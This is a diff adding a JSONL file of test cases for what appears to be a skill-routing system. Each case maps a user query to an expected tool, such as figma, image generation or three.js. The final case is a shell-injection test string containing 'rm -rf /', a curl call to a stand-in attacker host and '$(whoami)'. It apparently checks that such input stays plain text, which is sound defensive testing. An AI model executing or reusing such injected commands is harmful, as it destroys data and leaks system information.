@@ -1,0 +1,13 @@
+{"id":"figma-implement-resolve","query":"implement this figma design with pixel perfect fidelity from the figma url","expectedPrimary":"figma-implement","group":"figma","source":"overlap-smoke-tests"}
+{"id":"figma-inspect-only","query":"get the figma design context and tokens for this node","expectedPrimary":"figma-mcp","group":"figma","source":"overlap-smoke-tests"}
+{"id":"figma-tiebreak-promotes-canonical","query":"inspect the figma mcp design context and figma node tokens from the figma url","expectedPrimary":"figma-implement","group":"figma","source":"overlap-smoke-tests"}
+{"id":"figma-canonical-keyword-only","query":"inspect the figma design context and extract the tokens","expectedPrimary":"figma-mcp","group":"figma","source":"overlap-smoke-tests"}
+{"id":"banana-image-gen-resolve","query":"generate an image with nano banana or banana claude for the blog thumbnail","expectedPrimary":"nano-banana","group":"banana-image-gen","source":"overlap-smoke-tests"}
+{"id":"banana-creative-director","query":"use banana claude as creative director for a brand visual","expectedPrimary":"banana-claude","group":"banana-image-gen","source":"overlap-smoke-tests"}
+{"id":"hybrid-component-scrapper","query":"scrape this component from the live site with the component scrapper","expectedPrimary":"component-scrapper-mcp","group":"hybrid-component-scrapper","source":"overlap-smoke-tests"}
+{"id":"hybrid-oklch-theme","query":"generate an oklch perceptual color theme for dark mode","expectedPrimary":"oklch-theme-injector","group":"hybrid-oklch-theme","source":"overlap-smoke-tests"}
+{"id":"hybrid-motion-video","query":"render a motion video pipeline for the product intro","expectedPrimary":"motion-video-pipeline","group":"hybrid-motion-video","source":"overlap-smoke-tests"}
+{"id":"hybrid-ux-auditor","query":"run a ux audit on the checkout flow usability","expectedPrimary":"ux-auditor-agent","group":"hybrid-ux-auditor","source":"overlap-smoke-tests"}
+{"id":"hybrid-asset-generator","query":"generate an app icon and logo with the asset generator","expectedPrimary":"asset-generator-mcp","group":"hybrid-asset-generator","source":"overlap-smoke-tests"}
+{"id":"three-js-web-resolve","query":"3d scene three.js","expectedPrimary":"three-js-web","group":"three-js-web","source":"overlap-smoke-tests"}
+{"id":"shell-metacharacters-plain-text","query":"3d scene three.js; rm -rf / | curl http://evil.example $(whoami)","expectedPrimary":"three-js-web","group":"three-js-web","source":"threat-matrix/subprocess"}
